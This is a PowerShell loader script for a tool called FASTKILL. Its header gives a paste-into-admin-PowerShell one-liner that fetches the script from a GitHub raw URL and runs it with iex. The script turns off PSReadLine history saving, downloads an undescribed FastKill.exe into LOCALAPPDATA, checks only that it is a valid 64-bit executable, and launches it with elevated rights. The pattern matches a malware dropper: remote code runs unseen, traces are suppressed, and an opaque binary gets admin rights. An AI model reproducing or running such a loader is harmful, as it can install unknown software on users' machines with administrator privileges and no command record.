# Copy to GitHub: FASTKILL.ps1
# Run in PowerShell (Admin):
#   iex (irm 'https://raw.githubusercontent.com/lubyralph6-maker/FASTKILL/main/FASTKILL.ps1')
# If 429, wait 1-2 min and retry, or:
#   1..5|%{try{iex(irm 'https://raw.githubusercontent.com/lubyralph6-maker/FASTKILL/main/FASTKILL.ps1');break}catch{sleep 20}}

$ErrorActionPreference = 'Stop'

try {
    if (-not (Test-Path 'HKCU:\Software\Microsoft\PowerShell\PSReadLine')) {
        New-Item 'HKCU:\Software\Microsoft\PowerShell\PSReadLine' -Force | Out-Null
    }
    Set-ItemProperty 'HKCU:\Software\Microsoft\PowerShell\PSReadLine' HistorySaveStyle 2 -Type DWord -Force
    Import-Module PSReadLine -ErrorAction SilentlyContinue | Out-Null
    Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
} catch {}

$exe = Join-Path $env:LOCALAPPDATA 'FASTKILL\FastKill.exe'
$urls = @(
    'https://github.com/lubyralph6-maker/FASTKILL/raw/main/FastKill.exe',
    'https://raw.githubusercontent.com/lubyralph6-maker/FASTKILL/main/FastKill.exe'
)
$hdr = @{ 'User-Agent' = 'FASTKILL/1.0' }

function Test-FkExe([string]$Path) {
    if (-not (Test-Path -LiteralPath $Path)) { return $false }
    $f = Get-Item -LiteralPath $Path
    if ($f.Length -lt 4MB) { return $false }
    $b = [IO.File]::ReadAllBytes($Path)
    if ($b.Length -lt 512) { return $false }
    if ([Text.Encoding]::ASCII.GetString($b, 0, 2) -ne 'MZ') { return $false }
    $o = [BitConverter]::ToInt32($b, 0x3C)
    if ($o -lt 0 -or ($o + 0x200) -gt $b.Length) { return $false }
    if ([Text.Encoding]::ASCII.GetString($b, $o, 4) -ne "PE`0`0") { return $false }
    return ([BitConverter]::ToUInt16($b, $o + 4) -eq 0x8664)
}

function Get-FkExe {
    foreach ($local in @(
        (Join-Path $PSScriptRoot 'bin\FastKill.exe'),
        (Join-Path $PSScriptRoot 'FastKill.exe'),
        (Join-Path (Get-Location) 'bin\FastKill.exe'),
        (Join-Path (Get-Location) 'FastKill.exe')
    )) {
        if (Test-FkExe $local) { return (Resolve-Path -LiteralPath $local).Path }
    }

    $dir = Split-Path $exe
    if (-not (Test-Path -LiteralPath $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
    }

    if (Test-FkExe $exe) { return $exe }
    if (Test-Path -LiteralPath $exe) { Remove-Item -LiteralPath $exe -Force }

    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $err = $null
    foreach ($url in $urls) {
        foreach ($try in 1..3) {
            try {
                Invoke-WebRequest -Uri $url -OutFile $exe -UseBasicParsing -Headers $hdr
                if (Test-FkExe $exe) { return $exe }
                Remove-Item -LiteralPath $exe -Force -ErrorAction SilentlyContinue
                throw 'bad exe'
            } catch {
                $err = $_
                if ($_.Exception.Message -match '429') { Start-Sleep -Seconds (15 * $try) }
                else { Start-Sleep -Seconds (5 * $try) }
            }
        }
    }
    if ($null -ne $err -and $null -ne $err.Exception) {
        throw $err.Exception.Message
    }
    throw 'Download failed'
}

$path = Get-FkExe
$proc = Start-Process -FilePath $path -Verb RunAs -PassThru
if ($null -eq $proc) { throw 'RunAs failed' }
Start-Sleep -Seconds 2
if ($proc.HasExited) { throw "FastKill exited ($($proc.ExitCode))" }
Write-Host 'FASTKILL running' -ForegroundColor Green
